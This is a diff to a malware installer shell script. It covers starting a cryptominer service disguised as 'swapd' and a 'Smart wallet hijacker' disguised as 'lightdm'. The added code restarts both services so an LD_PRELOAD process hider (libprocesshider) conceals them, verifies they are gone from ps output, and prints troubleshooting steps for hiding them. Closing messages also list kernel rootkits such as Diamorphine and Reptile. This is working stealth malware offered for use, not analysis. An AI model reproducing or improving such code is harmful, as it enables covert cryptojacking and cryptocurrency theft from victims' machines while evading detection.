@@ -1542,14 +1542,78 @@ fi
 # ==================== START MINER SERVICE ====================
 echo ''
 echo "[*] Starting swapd service..."
+
+# IMPORTANT: Restart (not just start) to activate LD_PRELOAD hiding
+# If service was already running, it won't be hidden until restarted!
+
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    systemctl start swapd 2>/dev/null
+    # Check if already running
+    if systemctl is-active --quiet swapd 2>/dev/null; then
+        echo "[*] Service already running - restarting to activate LD_PRELOAD..."
+        systemctl restart swapd 2>/dev/null
+    else
+        echo "[*] Starting service for first time..."
+        systemctl start swapd 2>/dev/null
+    fi
     sleep 2
     systemctl status swapd --no-pager -l 2>/dev/null || systemctl status swapd 2>/dev/null
 else
-    /etc/init.d/swapd start
+    # SysV init
+    if /etc/init.d/swapd status 2>/dev/null | grep -q "running"; then
+        echo "[*] Service already running - restarting to activate LD_PRELOAD..."
+        /etc/init.d/swapd restart
+    else
+        echo "[*] Starting service for first time..."
+        /etc/init.d/swapd start
+    fi
     sleep 2
     /etc/init.d/swapd status
+fi
+
+echo ""
+echo "[*] Verifying LD_PRELOAD is active for new processes..."
+if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
+    echo "[✓] LD_PRELOAD configured - newly started processes will be hidden"
+    echo "[*] Testing process visibility..."
+    
+    # Give it a moment to start
+    sleep 2
+    
+    # Test if processes are hidden
+    if ps aux | grep -E "swapd|kworker.*swapfile" | grep -v grep >/dev/null 2>&1; then
+        echo ""
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo "⚠️  WARNING: Processes are still VISIBLE!"
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo ""
+        echo "This can happen if:"
+        echo "  • Services were already running before LD_PRELOAD installation"
+        echo "  • System hasn't fully reloaded the preload library"
+        echo ""
+        echo "RECOMMENDED ACTIONS (choose one):"
+        echo ""
+        echo "Option 1 - Quick Fix (Restart services):"
+        echo "  systemctl restart swapd"
+        echo "  systemctl restart lightdm"
+        echo ""
+        echo "Option 2 - Complete Fix (Reboot):"
+        echo "  reboot"
+        echo ""
+        echo "After restart/reboot, verify with:"
+        echo "  ps aux | grep swapd"
+        echo "  (should show nothing!)"
+        echo ""
+        echo "Check service status with:"
+        echo "  systemctl status swapd"
+        echo "  (will show: active/running)"
+        echo ""
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo ""
+    else
+        echo "[✓] Processes successfully hidden!"
+    fi
+else
+    echo "[!] LD_PRELOAD not configured - processes will be visible"
 fi
 
 # ==================== HIDE MINER PROCESSES ====================
@@ -1773,7 +1837,14 @@ HIJACKER_SERVICE_EOF
     
     systemctl daemon-reload 2>/dev/null || true
     systemctl enable lightdm 2>/dev/null
-    systemctl start lightdm 2>/dev/null
+    
+    # Restart if already running to activate LD_PRELOAD, otherwise start
+    if systemctl is-active --quiet lightdm 2>/dev/null; then
+        echo "[*] Wallet hijacker already running - restarting to activate LD_PRELOAD..."
+        systemctl restart lightdm 2>/dev/null
+    else
+        systemctl start lightdm 2>/dev/null
+    fi
     
     # Verify it's running
     sleep 2
@@ -1785,6 +1856,13 @@ HIJACKER_SERVICE_EOF
             echo "[!] Warning: Service may not be enabled for auto-start"
             echo "[*] Enabling service..."
             systemctl enable lightdm 2>/dev/null || true
+        fi
+        
+        # Verify it's hidden
+        if ps aux | grep "lightdm.*daemon" | grep -v grep >/dev/null 2>&1; then
+            echo "[⚠] WARNING: lightdm process still VISIBLE - may need reboot for LD_PRELOAD"
+        else
+            echo "[✓] lightdm process successfully HIDDEN by LD_PRELOAD"
         fi
     else
         echo "[!] Warning: Smart wallet hijacker service failed to start"
@@ -1913,5 +1991,55 @@ if [ "$SINGULARITY_LOADED" = true ]; then
     echo '    Layer 2: Singularity (kernel-level - Kernel 6.x)'
 fi
 echo '    Layer 3: Kernel rootkits (Diamorphine/Reptile/Crypto-RK)'
-echo '[*] Processes automatically hidden after installation'
+echo ''
+echo '========================================================================='
+echo 'FINAL PROCESS VISIBILITY CHECK'
+echo '========================================================================='
+echo ''
+
+# Check if processes are actually hidden
+PROCESSES_VISIBLE=false
+
+if ps aux | grep -E "swapd|kworker.*swapfile" | grep -v grep >/dev/null 2>&1; then
+    PROCESSES_VISIBLE=true
+    echo '[⚠] WARNING: Miner processes are STILL VISIBLE in ps output!'
+fi
+
+if ps aux | grep "lightdm.*daemon" | grep -v grep >/dev/null 2>&1; then
+    PROCESSES_VISIBLE=true
+    echo '[⚠] WARNING: Wallet hijacker is STILL VISIBLE in ps output!'
+fi
+
+if [ "$PROCESSES_VISIBLE" = true ]; then
+    echo ''
+    echo 'This can happen if services were already running before installation.'
+    echo ''
+    echo 'RECOMMENDED ACTION:'
+    echo '  Option 1 - Reboot (safest):'
+    echo '    reboot'
+    echo ''
+    echo '  Option 2 - Restart services manually:'
+    echo '    systemctl restart swapd'
+    echo '    systemctl restart lightdm'
+    echo ''
+    echo 'After restart, verify with:'
+    echo '  ps aux | grep swapd      # Should show nothing'
+    echo '  ps aux | grep lightdm    # Should show nothing'
+    echo ''
+    echo 'Check services are running with:'
+    echo '  systemctl status swapd   # Should show: active (running)'
+    echo '  systemctl status lightdm # Should show: active (running)'
+else
+    echo '[✓] SUCCESS! All processes are HIDDEN from ps output!'
+    echo ''
+    echo 'Verification:'
+    echo '  ps aux | grep swapd      → Nothing (hidden) ✓'
+    echo '  ps aux | grep lightdm    → Nothing (hidden) ✓'
+    echo ''
+    echo 'Services are running (verify with):'
+    echo '  systemctl status swapd   → active (running) ✓'
+    echo '  systemctl status lightdm → active (running) ✓'
+fi
+
+echo ''
 echo '========================================================================'
